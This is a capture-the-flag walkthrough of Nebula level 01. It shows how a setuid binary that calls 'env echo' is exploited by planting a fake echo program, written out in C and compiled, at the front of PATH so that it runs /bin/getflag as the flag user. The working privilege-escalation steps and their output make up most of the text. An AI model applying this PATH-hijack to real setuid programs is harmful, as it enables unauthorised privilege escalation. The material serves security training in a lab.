**Intro**

Level 01 brings us to a new problem.
In this source a system call is being made as shown
```
system("/usr/bin/env echo and now what?");
```

The problems in this level exist on three levels:
- `/usr/bin/env` is sourcing the *USERS* environment
- `echo` will be executed from the *first* location it is discovered
- `/home/flag01`, the compiled application from the source in the readme, is sticky as flag user *flag01*, and user level01 can execute this file

```
﻿level01@nebula:/home/flag01$ ls -la flag01
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
```

What this means is that user `level01` can control the path in which `echo` will be searched for

First, I'll create a small application to call `/bin/getflag` and name it echo

**Source: echo.c**
```
﻿#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main ()
{
system("/bin/getflag");
}
```

Then compile it...

```
﻿level01@nebula:~$ gcc echo.c -o echo
```

But, this isn't enough!

```
﻿level01@nebula:~$ ./echo
getflag is executing on a non-flag account, this doesn't count
```

So, we'll coerce the flag01 suid file to run this for us by injecting our echo into the path

```
﻿level01@nebula:~$ export PATH=/home/level01:$PATH
```

And the results are quite satisfying!

```
﻿level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account
```